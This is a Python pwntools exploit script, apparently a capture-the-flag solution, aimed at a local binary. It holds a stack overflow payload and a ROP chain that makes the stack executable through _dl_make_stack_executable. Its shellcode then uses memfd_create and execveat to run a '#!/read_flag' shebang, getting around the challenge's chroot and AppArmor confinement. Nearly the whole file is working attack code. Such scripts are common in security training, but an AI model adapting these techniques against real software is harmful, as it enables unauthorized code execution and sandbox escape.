# sudo -s
#!/usr/bin/env python3	
#encoding: utf-8

from pwn import *

context.binary = "./app/new_app"
elf = context.binary

io = process('./run.sh')
#io = process("./app/new_app") # 這樣子繞不過 apparmor 不知道為什麼
#shebang = ./app/new_app  or /home/oem/.../new_app 都不行

payload = flat(
        '0' * 0x108,
        0x0000000000400686, # pop rdi; ret;
        elf.sym['__stack_prot'] - 8,
        0x0000000000415234, # pop rax; ret;
        7,
        0x0000000000416106, # mov qword ptr [rdi + 8], rax; ret;
        0x0000000000400686, # pop rdi; ret;
        elf.sym['__libc_stack_end'],
        elf.sym['_dl_make_stack_executable'],
        0x00000000004941fb, # jmp rsp;
        )

shebang = "#!/read_flag"
sc  = asm(shellcraft.pushstr("fuck"))
sc += asm(shellcraft.syscall(319, "rsp", 0)) # memfd_create("fuck", 0)
sc += asm('''mov r12, rax''')
sc += asm(shellcraft.pushstr(shebang)) # because chroot --userspec=65534:65534 app /new_app read_flag is in root directory
sc += asm(shellcraft.write("r12", "rsp", len(shebang)))
sc += asm('''
        push 0
        mov rsi, rsp
        xor rdx, rdx
        xor r10, r10
        mov r8, 0x1000
        mov rax, 322
        mov rdi, r12
        syscall
        ''')    # stub_execveat(3, [0], 0, 0, 0)
sc += asm(shellcraft.exit(0))

payload += (sc)

#  gdb.attach(io, "b *0x4941fb\nc")
write("payload", payload)
io.sendline(payload)

io.interactive()